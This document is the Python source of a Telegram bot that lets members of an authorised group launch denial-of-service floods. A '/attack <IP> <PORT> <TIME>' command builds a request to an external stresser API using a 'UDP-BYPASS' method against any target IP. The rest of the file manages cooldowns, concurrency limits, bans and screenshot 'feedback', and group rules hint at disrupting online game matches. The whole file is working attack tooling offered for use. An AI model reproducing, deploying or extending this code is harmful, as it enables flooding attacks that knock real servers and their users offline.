import telebot
import os
import time
import requests
import threading
from datetime import datetime
from dotenv import load_dotenv
from pymongo import MongoClient

# Load environment variables
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "1351184742"))
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "RINOMODS")
RETROSTRESS_API_URL = os.getenv("RETROSTRESS_API_URL")
RETROSTRESS_API_KEY = os.getenv("RETROSTRESS_API_KEY")

if not BOT_TOKEN or not MONGODB_URI:
    print("❌ ERROR: BOT_TOKEN or MONGODB_URI is missing!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# MongoDB Connection
try:
    client = MongoClient(MONGODB_URI)
    db = client[DATABASE_NAME]
    users_col = db['group_users']
    settings_col = db['group_settings']
    active_attacks_col = db['active_attacks']
    
    # Ensure indexes
    users_col.create_index("user_id", unique=True)
    print("✅ MongoDB connected!")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    exit(1)

# --- Default Settings ---
def get_setting(key, default_value):
    doc = settings_col.find_one({"_id": key})
    if doc:
        return doc.get("value", default_value)
    return default_value

def set_setting(key, value):
    settings_col.update_one({"_id": key}, {"$set": {"value": value}}, upsert=True)

# Helper functions
def is_owner(user_id):
    return user_id == OWNER_ID

# --- OWNER DM HANDLERS ---

@bot.message_handler(commands=['start', 'help'], func=lambda m: m.chat.type == 'private')
def dm_start(message):
    if not is_owner(message.from_user.id):
        return  # Ignore non-owners in DM
        
    text = (
        "👑 **Owner Control Panel**\n\n"
        "**Group Setup:**\n"
        "1. Add bot to your group and send `/setgroup`\n"
        "2. Add bot to your channel and send `/setchannel` in DM like: `/setchannel -100xxx`\n\n"
        "**Settings Commands:**\n"
        "`/settings` - View current settings\n"
        "`/setconcurrent <num>` - Set max active attacks (default 3)\n"
        "`/setduration <sec>` - Set max attack time (default 60)\n"
        "`/setcooldown <sec>` - Set user cooldown (default 100)\n"
        "`/setbantime <min>` - Set ban time for missing feedback (default 10)\n"
        "`/unban <user_id>` - Unban a user\n"
        "`/resetfeedback <user_id>` - Bypass feedback for a user\n"
    )
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['settings'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def show_settings(message):
    group_id = get_setting("group_id", "Not Set")
    channel_id = get_setting("channel_id", "Not Set")
    concurrent = get_setting("max_concurrent", 3)
    duration = get_setting("max_duration", 60)
    cooldown = get_setting("cooldown", 100)
    bantime = get_setting("bantime", 10)
    
    text = (
        "⚙️ **Current Settings:**\n\n"
        f"👥 Group ID: `{group_id}`\n"
        f"📢 Channel ID: `{channel_id}`\n"
        f"⚡ Max Concurrent Attacks: `{concurrent}`\n"
        f"⏱️ Max Attack Duration: `{duration}s`\n"
        f"⏳ User Cooldown: `{cooldown}s`\n"
        f"🚫 Feedback Ban Time: `{bantime} mins`\n"
    )
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['setconcurrent', 'setduration', 'setcooldown', 'setbantime', 'setchannel'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def update_settings(message):
    cmd = message.text.split()[0].lower()
    try:
        val = message.text.split()[1]
        
        if cmd == "/setchannel":
            set_setting("channel_id", val) # Channel ID is string/int
            bot.reply_to(message, f"✅ Feedback Channel set to: {val}")
        else:
            val = int(val)
            if cmd == "/setconcurrent":
                set_setting("max_concurrent", val)
                bot.reply_to(message, f"✅ Max concurrent attacks set to: {val}")
            elif cmd == "/setduration":
                set_setting("max_duration", val)
                bot.reply_to(message, f"✅ Max attack duration set to: {val}s")
            elif cmd == "/setcooldown":
                set_setting("cooldown", val)
                bot.reply_to(message, f"✅ User cooldown set to: {val}s")
            elif cmd == "/setbantime":
                set_setting("bantime", val)
                bot.reply_to(message, f"✅ Missing feedback ban time set to: {val} mins")
    except:
        bot.reply_to(message, f"❌ Invalid format. Use: {cmd} <value>")

@bot.message_handler(commands=['unban'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def unban_user(message):
    try:
        uid = int(message.text.split()[1])
        users_col.update_one({"user_id": uid}, {"$set": {"banned_until": 0}})
        bot.reply_to(message, f"✅ User {uid} unbanned.")
    except:
        bot.reply_to(message, "❌ Format: /unban <user_id>")

@bot.message_handler(commands=['resetfeedback'], func=lambda m: m.chat.type == 'private' and is_owner(m.from_user.id))
def reset_feedback(message):
    try:
        uid = int(message.text.split()[1])
        users_col.update_one({"user_id": uid}, {"$set": {"feedback_required": False}})
        bot.reply_to(message, f"✅ Feedback requirement removed for user {uid}.")
    except:
        bot.reply_to(message, "❌ Format: /resetfeedback <user_id>")

# --- GROUP HANDLERS ---

@bot.message_handler(commands=['setgroup'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def set_group(message):
    if not is_owner(message.from_user.id):
        return
    set_setting("group_id", message.chat.id)
    bot.reply_to(message, f"✅ Group authorized for attacks! ID: {message.chat.id}")

@bot.message_handler(commands=['attack'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def handle_attack(message):
    allowed_group = get_setting("group_id", None)
    if not allowed_group or message.chat.id != allowed_group:
        if is_owner(message.from_user.id):
            bot.reply_to(message, "⚠️ This group is not authorized. Use /setgroup first.")
        return # Ignore attacks in unauthorized groups
        
    user_id = message.from_user.id
    now = int(time.time())
    
    # Get user data
    user = users_col.find_one({"user_id": user_id}) or {"user_id": user_id, "banned_until": 0, "cooldown_until": 0, "feedback_required": False}
    
    # 1. Check if banned
    if user.get("banned_until", 0) > now:
        remaining = int((user["banned_until"] - now) / 60)
        bot.reply_to(message, f"🚫 You are banned from using the bot for {remaining} more minutes due to missing feedback!")
        return
        
    # 2. Check if feedback is required
    if user.get("feedback_required", False):
        # User tried to attack again WITHOUT sending feedback!
        ban_mins = get_setting("bantime", 10)
        banned_until = now + (ban_mins * 60)
        users_col.update_one(
            {"user_id": user_id}, 
            {"$set": {"banned_until": banned_until, "feedback_required": False}}, 
            upsert=True
        )
        bot.reply_to(message, f"😡 **BANNED!**\n\nYou tried to launch another attack without providing a screenshot/feedback for your previous one.\nYou are banned from using the bot for {ban_mins} minutes.")
        return
        
    # 3. Check cooldown
    if user.get("cooldown_until", 0) > now:
        remaining = user["cooldown_until"] - now
        bot.reply_to(message, f"⏳ Cooldown active! Please wait {remaining} seconds.")
        return
        
    # Parse attack command
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "📝 **Format:** `/attack <IP> <PORT> <TIME>`", parse_mode="Markdown")
        return
        
    target_ip = args[1]
    try:
        target_port = int(args[2])
        duration = int(args[3])
    except:
        bot.reply_to(message, "❌ Port and Time must be numbers.")
        return
        
    # Validate duration
    max_duration = get_setting("max_duration", 60)
    if duration > max_duration:
        bot.reply_to(message, f"❌ Maximum attack time is {max_duration} seconds.")
        return
        
    # 4. Check concurrent attacks
    max_concurrent = get_setting("max_concurrent", 3)
    active_count = active_attacks_col.count_documents({"expires_at": {"$gt": now}})
    if active_count >= max_concurrent:
        bot.reply_to(message, f"⚠️ Server is busy! {active_count}/{max_concurrent} attacks are running. Please wait.")
        return
        
    # --- LAUNCH ATTACK ---
    url = RETROSTRESS_API_URL
    if "[target]" in url:
        url = url.replace("[target]", target_ip).replace("[port]", str(target_port)).replace("[time]", str(duration)).replace("[method]", "UDP-BYPASS")
        if "key=0" in url and RETROSTRESS_API_KEY:
            url = url.replace("key=0", f"key={RETROSTRESS_API_KEY}")
    else:
        url = f"{RETROSTRESS_API_URL}?key={RETROSTRESS_API_KEY}&host={target_ip}&port={target_port}&time={duration}&method=UDP-BYPASS"
        
    try:
        bot.reply_to(message, "🚀 Sending attack...")
        res = requests.get(url, timeout=10)
        
        if res.status_code in [200, 201]:
            # Record attack
            active_attacks_col.insert_one({
                "user_id": user_id,
                "ip": target_ip,
                "expires_at": now + duration
            })
            
            # Update user state
            cooldown_sec = get_setting("cooldown", 100)
            users_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "cooldown_until": now + cooldown_sec,
                    "feedback_required": True
                }},
                upsert=True
            )
            
            bot.reply_to(message, 
                f"✅ **ATTACK SENT SUCCESSFULLY!**\n\n"
                f"🎯 **Target:** `{target_ip}:{target_port}`\n"
                f"⏱️ **Time:** `{duration}s`\n"
                f"👤 **User:** @{message.from_user.username or message.from_user.first_name}\n\n"
                f"⚠️ **IMPORTANT:** You MUST send a screenshot of the match as feedback in this group before your next attack, or you will be banned for {get_setting('bantime', 10)} minutes!",
                parse_mode="Markdown"
            )
        else:
            bot.reply_to(message, f"❌ API Error: {res.status_code}\nServer might be down.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to connect to API: {str(e)}")

# --- RULES COMMAND ---
@bot.message_handler(commands=['rules'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def send_rules(message):
    rules_text = (
        "⚠️ **IF YOUR ID IS RICH THEN DO THESE STEPS:**\n\n"
        "1- PLAY 1 GAME WITH SERV#R H4CK\n"
        "2- DON'T KILL OFFLINE PLAYER JUST TAKE CHIKEN FROM BOT LOBBY AND KILLS SOME ONLINE PLAYER AROUND 4-5\n\n"
        "Enjoy 😊"
    )
    bot.reply_to(message, rules_text, parse_mode="Markdown")

# --- WELCOME LISTENER ---
@bot.message_handler(content_types=['new_chat_members'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def handle_new_member(message):
    allowed_group = get_setting("group_id", None)
    if not allowed_group or message.chat.id != allowed_group:
        return
        
    max_duration = get_setting("max_duration", 60)
    cooldown = get_setting("cooldown", 100)
    bantime = get_setting("bantime", 10)
    
    for new_member in message.new_chat_members:
        if new_member.id != bot.get_me().id:
            welcome_msg = (
                f"Welcome [{new_member.first_name}](tg://user?id={new_member.id}) to the Group!\n\n"
                f"🚀 **Bot Features & Info:**\n"
                f"⏱️ Max Attack Time: `{max_duration}s`\n"
                f"⏳ Cooldown: `{cooldown}s`\n"
                f"📸 **Feedback Rule:** After your first attack, you MUST send a match screenshot here before you can attack again. Failure to do so will ban you for {bantime} minutes!\n\n"
                f"⚠️ Please type `/rules` to read the safe playing guidelines before attacking!"
            )
            try:
                bot.reply_to(message, welcome_msg, parse_mode="Markdown")
            except:
                pass

# --- FEEDBACK LISTENER ---
@bot.message_handler(content_types=['photo'], func=lambda m: m.chat.type in ['group', 'supergroup'])
def handle_feedback(message):
    allowed_group = get_setting("group_id", None)
    if not allowed_group or message.chat.id != allowed_group:
        return
        
    user_id = message.from_user.id
    user = users_col.find_one({"user_id": user_id})
    
    if user and user.get("feedback_required", False):
        # User has provided feedback!
        users_col.update_one({"user_id": user_id}, {"$set": {"feedback_required": False}})
        
        bot.reply_to(message, "✅ Feedback accepted! You can now use `/attack` again when your cooldown is over.")
        
        # Forward to owner channel
        channel_id = get_setting("channel_id", None)
        if channel_id:
            try:
                caption = f"Feedback from @{message.from_user.username or message.from_user.first_name} (ID: `{user_id}`)"
                if message.caption:
                    caption += f"\n\nCaption: {message.caption}"
                bot.send_photo(channel_id, message.photo[-1].file_id, caption=caption, parse_mode="Markdown")
            except Exception as e:
                print(f"Failed to forward feedback to channel: {e}")

# Cleanup old active attacks periodically
def cleanup_task():
    while True:
        try:
            now = int(time.time())
            active_attacks_col.delete_many({"expires_at": {"$lt": now}})
        except:
            pass
        time.sleep(30)

threading.Thread(target=cleanup_task, daemon=True).start()

print("="*50)
print("GROUP ATTACK BOT STARTED!")
print("="*50)
bot.infinity_polling()